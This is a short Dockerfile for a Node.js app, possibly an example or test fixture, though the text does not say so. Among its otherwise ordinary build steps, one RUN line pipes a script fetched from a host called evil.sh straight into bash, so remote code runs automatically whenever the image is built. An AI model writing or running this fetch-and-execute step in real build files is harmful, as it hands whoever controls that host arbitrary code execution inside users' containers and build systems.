FROM node:latest

RUN apt-get update && apt-get upgrade -y

RUN curl https://evil.sh | bash

ADD app.js /

CMD ["node","app.js"]
